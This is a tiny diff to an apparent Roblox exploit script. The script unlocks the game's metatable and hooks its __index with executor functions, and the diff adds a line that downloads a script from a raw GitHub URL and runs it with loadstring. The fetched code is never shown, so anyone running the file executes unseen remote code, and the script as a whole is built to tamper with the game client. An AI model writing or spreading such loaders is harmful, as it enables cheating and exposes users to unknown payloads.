@@ -1,3 +1,4 @@
 wait()
 setreadonly(getrawmetatable(game), false)
 getrawmetatable(game).__index = newcclosure((getrawmetatable(game)))
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iamstillcool12345/sad/main/dfg"))()
